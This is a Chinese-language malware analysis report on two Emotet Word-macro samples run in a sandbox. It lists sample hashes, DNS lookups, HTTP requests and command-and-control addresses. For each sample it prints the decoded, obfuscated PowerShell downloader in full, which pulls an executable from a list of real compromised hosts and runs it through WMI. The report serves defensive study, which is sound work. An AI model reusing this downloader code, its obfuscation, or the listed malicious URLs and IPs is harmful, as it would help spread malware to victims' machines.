Emotet 具有高持久性和反规避机制，例如，能识别沙盒和虚拟机并选择是否通过虚假的行为来摆脱被研究。

## W97M.Emotet.38616

### 分析结果链接

- [9753345689b4a9807df97ef55a6f73ae295aa23114df7727952483430b6ad127 (MD5: D94DA626DE93EB7CDFCB7351C7551DB0) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/ff7262ed-b298-4e47-9ec7-35300dd91dcd/#)

- Fake Net：[9753345689b4a9807df97ef55a6f73ae295aa23114df7727952483430b6ad127 (MD5: D94DA626DE93EB7CDFCB7351C7551DB0) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/26b814ae-f7e3-4116-ba25-d6ac4726b936/)
  - Fake Net 模式拦截 HTTP 请求并返回 404 Not Found

### DNS Resolutions

Domain | IP | Network (Fake Net or not)
-|-|-
amventas.com|149.56.200.84|✖ & ✔
www.cotrafina.com|51.83.37.21|✔
webappbr.com|189.45.192.37|✔
whatsappsenderpro.com|37.187.90.62|✔
bartboutens.nl|185.182.56.69|✔

<span id="1">

### HTTP Requests

- 下载可执行文件并执行<br>
![Host: amventas.com](img/amventas-exe-download.jpg)
  - 创建子进程，子进程再向 http://47.146.117.214/DUquQ9ANq3P/RlSOqVmh/nxR4JN8UgNHs/iyvFmwLuT/ 发送 POST 请求，内容包含大段空字符

### HTTP Requests - Fake Net

- 同样，先访问 amventas.com 下载可执行文件，下载失败
- 分别向`www.cotrafina.com`、`webappbr.com`、`whatsappsenderpro.com`和`bartboutens.nl`发送 HTTP GET 请求

  Host|Actual Response
  -|-
  www.cotrafina.com|File not found.
  webappbr.com|[an EXE file](https://app.any.run/tasks/179c038b-1177-4f43-ac96-91c0599c224f)（检测到 Emotet，向 http://142.105.151.124:443/N2l2ymAH/ 发送 POST 请求）
  whatsappsenderpro.com|Nothing
  bartboutens.nl|403 Forbidden

- 由 http://bartboutens.nl/wp-admin/no77z_k3_azs/ 的路由`wp-admin/`推测出当前请求的是 WordPress 的管理员界面下的内容，判断该请求需要管理员权限（通过恶意软件应该可以访问 XD）
  - 访问时返回的 favicon 是 WordPress 的 Logo<br>
![WordPress 的 Logo](img/403-wp.jpg)

### Powershell 命令

无论是否处于 Fake Net，执行的 Powershell 命令是一样的（需要 Base64 解码，解码后每个字符间含一个空白符，需要另外处理）
```bash
$WIQOPiyv='VDSJKjof';
[Net.ServicePointManager]::"s`eCurIT`Y`prot`oC`ol" = 'tls12, tls11, tls';
$FLWJRcfd = '684';
$XYOXHmoo='DMTBXycm';
$YGCGBzno=$env:userprofile+'\'+$FLWJRcfd+'.exe';$KRUHFrsl='WANVMkff';
$KUAJEmdy=&('ne'+'w-o'+'bject') NeT.wEbCLieNT;

# 对应上述请求的网址
$EZNKVfta='http://amventas.com/public/iu1c_vtucu_ruec/*http://www.cotrafina.com/wp-content/xrmq_7ug_ttv/*http://webappbr.com/wp-admin/ha_s5_3wf/*http://whatsappsenderpro.com/Videos/4wl_0q0m_g61c3/*http://bartboutens.nl/wp-admin/no77z_k3_azs/'."S`pLIT"([char]42);

$ILJBBuqs='BCVLIwgu';
foreach($NDVGBrzv in $EZNKVfta){
  try{
    $KUAJEmdy."Dow`NL`OAdfi`Le"($NDVGBrzv, $YGCGBzno);
    $FQTWFvmr='UHAJVsdu';

    # 如果下载文件的长度大于等于 20892 字节，就结束网址遍历
    # 并执行当前下载的文件
    If ((.('Get'+'-It'+'em') $YGCGBzno)."LeN`GTh" -ge 20892)
    {
      ([wmiclass]'win32_Process')."C`ReatE"($YGCGBzno);
      $IQAQNvqj='LSRORjao';
      break;
      $LGNPJfwk='SGCHNvil'
    }

  }
  catch{}
}
$FZFBOmhf='CSIZVdbi'
```

## Downloader/DOC.Emotet.S1265

### 分析结果链接

- [695b50903e39a9948a722321c64d4a35f6a2fb5fd960513dbbc818500a2a9e2e (MD5: 369D334368C2F3AD80F27BFCF2521329) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/2f89de65-e161-4de8-8582-76f1c047e599)
- Fake Net：[695b50903e39a9948a722321c64d4a35f6a2fb5fd960513dbbc818500a2a9e2e (MD5: 369D334368C2F3AD80F27BFCF2521329) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/9a0356f2-2566-4870-bb65-94db07d1cb47)

### DNS Resolutions

Domain | IP | Network (Fake Net or not)
-|-|-
mc-interiorismo.com|217.76.130.170|✖ & ✔
mc130.com|152.44.32.37|✔
mentarimedia.com|108.174.147.82|✔
mellysphotography.com|101.0.112.233|✔
vipmein.com|31.14.23.203|✔

<span id="2">

### HTTP Requests

- 下载可执行文件并执行<br>
![Host: mc-interiorismo.com](img/mc-exe-download.jpg)
  - 创建子进程，子进程分别向 http://73.116.193.136/LkstvyMl/CVXolBsiY/cJlvw/ 和 http://185.94.252.13:443/PfbyXeG7uaEFVu/FXwVTtD0b1YbdZKz/l28YgTshaeHZDJ/ （443 端口，但使用的是 HTTP 协议） 发送 POST 请求，内容均包含大段空字符

### HTTP Requests - Fake Net

- 先从 mc-interiorismo.com 获取可执行文件，下载失败
- 分别向`mc130.com`、`mentarimedia.com`、`mellysphotography.com`和`vipmein.com`发送 HTTP GET 请求

  Host|Actual Response
  -|-
  mc130.com|[an EXE file](https://app.any.run/tasks/d047fc27-4f40-4b88-836f-cb257dd2548b)（检测到 Emotet，分别向 http://73.116.193.136/MUORKTNGB2/ 和 http://185.94.252.13:443/8GT4/SS18m8aX5mkcu/nLfj6C3i/ 发送 POST 请求）
  mentarimedia.com|401 Authorization Required（需要提供用户名和密码）
  mellysphotography.com| 404 Not Found
  vipmein.com|404 Not Found

### Powershell 命令

Base64 解码，处理空白符，美化代码👇
```bash
$OVIFTjcd='XRACQbok';
[Net.ServicePointManager]::"SeC`Ur`iT`YPr`o`TOCol" = 'tls12, tls11, tls';
$UZGPUcmi = '641';
$NSGSLpzd='CVPKWtsh';
$NGRDQptr=$env:userprofile+'\'+$UZGPUcmi+'.exe';
$IMHBNkwz='SJEAJmzv';
$PFTXFiyw=.('new-'+'o'+'bject') NET.WebCLient;

# 对应上述请求的网址
$QJVLDmud='http://mc-interiorismo.com/theme/Rk/*http://mc130.com/SHB/KloCHjT/*http://mentarimedia.com/modules/p6N365/*http://mellysphotography.com/large/Rem220541/*http://vipmein.com/assets2/6eeP7BwazY/'."Sp`LIT"([char]42);

$IDXPTgha='HGEIYuec';
foreach($SPSXErgd in $QJVLDmud){
  try{
    $PFTXFiyw."dowNloA`dfI`Le"($SPSXErgd, $NGRDQptr);
    $FMFVVlth='PCLDLaok';

    # 如果下载文件的长度大于等于 22745 字节，就结束网址遍历
    # 并执行当前下载的文件
    If ((&('Get'+'-Ite'+'m') $NGRDQptr)."l`ENGtH" -ge 22745)
    {
      ([wmiclass]'win32_Process')."C`R`EATE"($NGRDQptr);
      $SSBTMaot='JLJWGhtj';
      break;
      $MHLWMlry='DVDUNqqk'
    }

  }
  catch{}
}
$ESTUHsbx='GFFVSrox'
```

## 总结

- 上述两个恶意软件均通过启用宏的 Word 文档完成注入，并在受感染的机器上下载安装并运行其他恶意软件，成功下载的可执行文件均检测到 Emotet
- 遍历网址集尝试下载其他恶意软件，一旦下载成功就终止遍历
- Powershell 执行的命令是可解可读的，因此没有直接连接 CnC 服务器，而是通过下载的 Emotet 进行连接，且不同渠道下载的 Emotet 连接的 CnC 服务器可能不同（[W97M.Emotet.38616](#1) 中连接的 CnC 服务器不同，[Downloader/DOC.Emotet.S1265](#2) 是相同的），一定程度上减少了 CnC 服务器链接暴露的可能
- 暂未发现有检测沙箱的行为

## 参考资料

- [Emotet Malware – An Introduction to the Banking Trojan | Malwarebytes](https://www.malwarebytes.com/emotet/)
- [Emotet - Malware Trends Tracker by ANY.RUN](https://any.run/malware-trends/emotet)